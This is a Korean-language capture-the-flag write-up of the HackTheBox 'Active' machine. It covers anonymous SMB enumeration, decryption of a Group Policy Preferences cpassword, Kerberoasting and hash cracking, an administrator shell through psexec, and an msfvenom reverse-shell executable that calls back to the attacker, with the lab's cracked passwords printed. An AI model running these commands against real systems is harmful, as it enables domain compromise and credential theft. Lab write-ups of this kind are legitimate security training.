# Active - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,3268,3269,389,445,464,47001,49152,49153,49154,49155,49157,49158,49165,49166,49167,53,5722,593,636,88,9389 -sC -sV -vv -oA active 10.10.10.100
```
<img width="1105" height="296" alt="image" src="https://github.com/user-attachments/assets/78e0fea8-78e9-49a9-ac41-feb5ac8d0551" />

- DNS(53)
- KERBEROS(88)
- LDAP(389)
- SMB(445)

---
## SMB
- `/etc/hots`에 `active.htb` 등록.
<img width="1105" height="68" alt="image" src="https://github.com/user-attachments/assets/d4ed4bab-f59c-404d-99b8-fc9478f9c5ef" />

<br>
<br>

- `anonymous` 로그인 성공.
```bash
smbmap -u '' -p '' -H 10.10.10.100
```
<img width="1105" height="206" alt="image" src="https://github.com/user-attachments/assets/22f1fd52-4f23-4d2f-8f5d-001db6a34bcc" />

<br>
<br>

- `/Replication`경로 탐색하여 `groups.xml`파일 발견.
```bash
smbmap -u '' -p '' -H 10.10.10.100 -r --depth=10
```
<img width="1105" height="80" alt="image" src="https://github.com/user-attachments/assets/386600df-0c5c-4100-b43b-0b222518d9d1" />

<br>
<br>

- 다운로드.
```bash
smbmap -u '' -p '' -H 10.10.10.100 --download 'Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml'
```
<img width="1105" height="201" alt="image" src="https://github.com/user-attachments/assets/9571c2c8-8dc6-4a97-bfab-438d102b7ea5" />

<br>
<br>

- `svc_tgs`유저의 `cpassword` 발견.
<img width="1105" height="229" alt="image" src="https://github.com/user-attachments/assets/69f8441d-923e-4974-ad12-d5707d556e26" />

<br>
<br>

- `gpp-decrypt`로 크래킹 시도.
```bash
gpp-decrypt -f groups.xml
```
<img width="1105" height="397" alt="image" src="https://github.com/user-attachments/assets/96fa7ee2-3b5c-4d9c-a8cc-8e63aeef40cc" />

<br>
<br>

- `svc_tgs:GPPstillStandingStrong2k18`로 SMB 로그인 가능.
<img width="1105" height="112" alt="image" src="https://github.com/user-attachments/assets/2e8a6d7f-7842-4a59-8369-fe8b0a486a55" />

---
## KERBEROS
- 셸형성을 할 수 없어 커버로스팅 시도하여 `Administrator` 해시 획득.
```bash
sudo ntpdate 10.10.10.100

impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/svc_tgs -request >hash
```
<img width="1105" height="374" alt="image" src="https://github.com/user-attachments/assets/4ee594db-f152-401c-9e3e-88a5b7177da2" />

<br>
<br>

- 크래킹.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1105" height="204" alt="image" src="https://github.com/user-attachments/assets/223c7091-ae80-4bf5-b519-c1572c9f5ada" />

<br>
<br>

- `administrator:Ticketmaster1968` 로그인 테스트 성공.
```bash
netexec smb 10.10.10.100 -u administrator -p 'Ticketmaster1968'
```
<img width="1105" height="118" alt="image" src="https://github.com/user-attachments/assets/18fd8ef8-0d7e-44c5-827e-31096ec181ae" />

<br>
<br>

- `psexec`로 셸 획득.
```bash
impacket-psexec active.htb/administrator:Ticketmaster1968@10.10.10.100
```
<img width="1105" height="316" alt="image" src="https://github.com/user-attachments/assets/13889aac-7908-4a82-8f3d-f9a217dd2fea" />

<br>
<br>

- 로컬에서 리버스 셸 페이로드 생성.
```bash
msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=80 -f exe -o shell.exe
```
<img width="1105" height="171" alt="image" src="https://github.com/user-attachments/assets/4d0c8dd1-8901-490c-8b2d-3dea53f5afe1" />

<br>
<br>

- 로컬로부터 다운로드 받아서 실행하여 셸 획득.
<img width="1105" height="211" alt="image" src="https://github.com/user-attachments/assets/9fe9a339-2ccb-4367-a6a1-cc80a5838f5d" />

---
## FLAG
- `c:\users\svc_tgs\desktop\user.txt`
<img width="1105" height="245" alt="image" src="https://github.com/user-attachments/assets/4223b7c4-d22a-4efa-a615-8362eb49c35b" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1105" height="245" alt="image" src="https://github.com/user-attachments/assets/904c9d89-fa61-45df-8f35-a3716bfce896" />













